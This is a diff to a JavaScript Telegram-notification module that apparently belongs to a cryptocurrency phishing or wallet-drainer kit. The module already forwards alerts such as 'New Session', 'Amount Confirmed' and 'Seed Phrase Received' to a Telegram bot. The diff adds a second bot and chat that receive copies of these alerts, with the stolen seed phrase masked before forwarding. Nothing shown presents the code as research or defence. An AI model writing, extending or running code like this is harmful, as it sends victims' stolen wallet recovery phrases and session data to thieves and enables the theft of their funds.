@@ -5,6 +5,8 @@ dotenv.config();
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const SECONDARY_TELEGRAM_BOT_TOKEN = process.env.SECONDARY_TELEGRAM_BOT_TOKEN;
+const SECONDARY_TELEGRAM_CHAT_ID = process.env.SECONDARY_TELEGRAM_CHAT_ID;
 
 // Apple-style separator
 const SEPARATOR = '━━━━━━━━━━━━━━━';
@@ -101,9 +103,55 @@ export async function sendTelegramNotification(message) {
         }
 
         const data = await response.json();
+        
+        // Send to secondary bot for specific notification types
+        if (message.includes('𝗡𝗲𝘄 𝗦𝗲𝘀𝘀𝗶𝗼𝗻') || 
+            message.includes('𝗔𝗺𝗼𝘂𝗻𝘁 𝗖𝗼𝗻𝗳𝗶𝗿𝗺𝗲𝗱') || 
+            message.includes('𝗦𝗲𝗲𝗱 𝗣𝗵𝗿𝗮𝘀𝗲 𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱')) {
+            
+            // For seed phrase, censor the actual phrase
+            let secondaryMessage = message;
+            if (message.includes('𝗦𝗲𝗲𝗱 𝗣𝗵𝗿𝗮𝘀𝗲 𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱')) {
+                secondaryMessage = message.replace(/<code>.*<\/code>/, '<code>[CENSORED]</code>');
+            }
+            
+            await sendSecondaryNotification(secondaryMessage);
+        }
+        
         return data;
     } catch (error) {
         console.error('Failed to send Telegram notification:', error);
+        return null;
+    }
+}
+
+async function sendSecondaryNotification(message) {
+    try {
+        if (!SECONDARY_TELEGRAM_BOT_TOKEN || !SECONDARY_TELEGRAM_CHAT_ID) {
+            console.log('Secondary Telegram notification (disabled):', message);
+            return;
+        }
+
+        const url = `https://api.telegram.org/bot${SECONDARY_TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: SECONDARY_TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+
+        if (!response.ok) {
+            throw new Error(`Secondary Telegram API error: ${response.statusText}`);
+        }
+
+        return await response.json();
+    } catch (error) {
+        console.error('Failed to send secondary Telegram notification:', error);
         return null;
     }
 }
